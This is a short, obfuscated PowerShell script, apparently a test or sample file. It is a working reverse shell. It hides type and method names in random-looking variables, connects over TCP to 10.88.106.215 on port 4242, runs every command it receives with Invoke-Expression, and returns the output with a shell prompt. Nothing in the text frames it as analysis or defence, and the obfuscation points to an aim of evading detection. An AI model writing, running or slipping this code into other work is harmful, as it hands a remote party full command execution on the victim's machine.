##Human Testing123###

$yC7x = 'System.Net.Sockets.TCPClient'
$aITB = 'System.Text.Encoding'
$Xk4s = [System.Text.Encoding]::ASCII
$cq5U = 'PS '
$gS3e = 'pwd'
$GtXm = {
    $data = $args[0]
    Invoke-Expression $data 2>&1 | Out-String
}
$kfrV = 'New-Object'
$kf4M = 'GetStream'
$qRD3 = 'GetBytes'
$UL8T = 'Write'
$uKmx = 'Flush'
$vY2J = 'Close'
$wWwb = 'Read'

$bpM7 = [Byte[]] (0..65535 | % { 0 })
$client = & $kfrV -TypeName $yC7x -ArgumentList '10.88.106.215', 4242
$stream = $client.$kf4M()

if ($stream) {
    while ($true) {
        $bytes = $bpM7
        $i = $stream.$wWwb($bytes, 0, $bytes.Length)
        if ($i -eq 0) { break }
        $data = $Xk4s.GetString($bytes, 0, $i)
        $sendback = & $GtXm $data
        $sendback2 = $sendback + $cq5U + (& $gS3e).Path + '> '
        $sendbyte = $Xk4s.$qRD3($sendback2)
        $stream.$UL8T($sendbyte, 0, $sendbyte.Length)
        $stream.$uKmx()
    }
}

$client.$vY2J()